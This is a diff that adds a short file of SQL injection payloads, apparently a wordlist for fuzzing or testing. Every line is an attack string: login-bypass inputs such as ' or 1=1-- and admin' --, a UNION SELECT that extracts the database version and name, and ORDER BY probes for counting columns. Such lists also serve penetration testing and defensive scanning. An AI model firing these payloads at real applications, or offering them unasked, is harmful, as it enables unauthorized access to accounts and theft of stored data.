@@ -1,0 +1,12 @@
+' or 1=1--
+" or 1=1--
+or 1=1
+' or '1'='1
+" or "1"="1
+admin' --
+admin' #
+admin'/*
+' UNION SELECT 1, version(), database() --
+1' ORDER BY 1--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
